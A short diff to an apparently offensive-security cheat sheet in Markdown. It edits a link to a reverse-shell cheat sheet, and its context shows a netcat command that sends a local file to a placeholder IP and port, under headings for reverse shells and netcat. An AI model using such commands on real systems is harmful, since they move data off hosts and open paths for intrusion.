@@ -20,7 +20,7 @@ Upload: <code>nc -nv [IP] [PORT] < [IN_FILE]</code>
 
 ## Reverse Shells
 
-[Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
+[Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ### Netcat
 
